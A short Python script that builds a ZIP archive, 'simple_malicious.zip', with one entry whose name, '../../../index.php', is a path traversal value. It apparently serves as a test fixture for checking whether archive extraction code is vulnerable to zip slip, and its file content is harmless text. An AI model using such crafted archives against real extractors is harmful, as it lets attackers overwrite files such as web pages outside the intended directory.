import zipfile

# Create a ZIP file with a simple path traversal pattern
with zipfile.ZipFile('simple_malicious.zip', 'w') as zf:
    zf.writestr('../../../index.php', 'This is a test file.')
